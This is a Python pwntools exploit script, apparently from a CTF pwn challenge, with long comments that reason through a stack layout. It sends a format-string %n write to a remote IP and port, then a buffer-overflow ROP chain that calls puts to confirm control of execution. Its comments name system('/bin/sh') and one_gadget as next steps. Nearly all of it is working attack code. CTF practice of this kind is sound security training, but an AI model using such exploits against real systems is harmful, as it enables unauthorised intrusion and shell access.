from pwn import *

context(arch='i386', os='linux', log_level='debug')

elf = ELF('pwn_permission')

# Let me re-examine the vuln function more carefully
from capstone import Cs, CS_ARCH_X86, CS_MODE_32
md = Cs(CS_ARCH_X86, CS_MODE_32)

vuln_addr = elf.symbols['vuln']
vuln_data = elf.read(vuln_addr, 0x49)

log.info("=== vuln function disassembly ===")
for insn in md.disasm(vuln_data, vuln_addr):
    log.info(f"0x{insn.address:x}:\t{insn.mnemonic}\t{insn.op_str}")

# Key analysis:
# 0x8049227:  push    ebp           ; save old ebp
# 0x8049228:  mov     ebp, esp      ; ebp = esp
# 0x804922a:  push    ebx           ; [ebp-4] = ebx
# 0x804922b:  sub     esp, 0x94     ; esp -= 0x94
# After this: esp = ebp - 4 - 0x94 = ebp - 0x98
# But the buffer is at ebp - 0x90 (from the lea instruction)
# Wait, that doesn't add up. Let me re-check.

# sub esp, 0x94 allocates 0x94 bytes on the stack
# After push ebx (4 bytes) and sub esp, 0x94:
# esp = ebp - 4 - 0x94 = ebp - 0x98

# But the buffer is at ebp - 0x90
# So there's 0x98 - 0x90 = 8 bytes between esp and the buffer start
# These 8 bytes might be used for local variables or alignment

# The read call: read(0, ebp-0x90, 0x100)
# Buffer starts at ebp-0x90, size 0x100 = 256 bytes

# Stack layout from buffer:
# [ebp-0x90]: buffer start (where read writes)
# [ebp-0x04]: saved ebx
# [ebp]:      saved ebp  
# [ebp+0x04]: return address

# Distance from buffer to return address:
# (ebp) - (ebp - 0x90) + 4 = 0x90 + 4 = 148

# But wait, the sub esp, 0x94 allocates MORE than 0x90 bytes
# Let me check if there's something between the buffer and saved ebx

# Actually, looking at the disassembly again:
# sub esp, 0x94 allocates 0x94 bytes
# push ebx uses 4 bytes
# Total stack frame = 0x94 + 4 = 0x98 bytes below ebp

# The buffer at ebp-0x90 is within this frame
# Between buffer end (ebp-0x90+0x100 would overflow) and saved ebx (ebp-4):
# Distance = 0x90 - 4 = 0x8C = 140 bytes from buffer to saved ebx

# From buffer to return address = 0x90 + 4 = 148 bytes

# This matches what I calculated before. The issue must be elsewhere.

# Let me check if the problem is with the saved ebx value
# vuln uses ebx as GOT base: add ebx, 0x2dca after call __x86.get_pc_thunk.bx
# The value of ebx after "add ebx, 0x2dca" should be 0x804c000

# But when vuln returns, it does:
# mov ebx, [ebp-4]  ; restore ebx from stack
# leave              ; mov esp, ebp; pop ebp
# ret

# So if we overwrite [ebp-4] with got_base (0x804c000),
# ebx will be restored to 0x804c000, which is correct

# The problem might be that system() also needs a properly aligned stack
# Or that system() crashes because of some other issue

# Let me try without the ret_gadget for alignment
# And also try with a different saved_ebp value

# Also, let me try using a one_gadget instead of system("/bin/sh")
# one_gadget doesn't need any arguments, just needs to satisfy constraints

# For now, let me try the simplest possible ROP chain
# and see if we can at least call puts or write to verify execution

target_val_addr = 0x804c030
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
got_base = 0x804c000

# Test: Can we call puts("test") from the ROP chain?
# If puts works, then the ROP chain offset is correct

# Connect and test
conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

# Format string
fmt_payload = p32(target_val_addr) + b'%1c%4$n'
conn.send(fmt_payload)

import time
time.sleep(1)
response = conn.recv(timeout=5)
log.info(f"After fmt: {response}")

# ROP: call puts with a known string address
# The string "Hope you have a good time here." is at 0x804a058
test_str_addr = 0x804a058

payload = b'A' * 140
payload += p32(got_base)        # saved ebx
payload += p32(0x41414141)      # saved ebp
payload += p32(puts_plt)        # call puts
payload += p32(0xdeadbeef)      # return addr
payload += p32(test_str_addr)   # arg: "Hope you have a good time here."

conn.send(payload)

time.sleep(2)

try:
    resp = conn.recv(timeout=5)
    log.info(f"puts response: {resp}")
    if b'Hope' in resp:
        log.success("ROP chain works! puts was called successfully!")
    else:
        log.info(f"Unexpected response: {resp}")
except Exception as e:
    log.error(f"Error: {e}")

conn.close()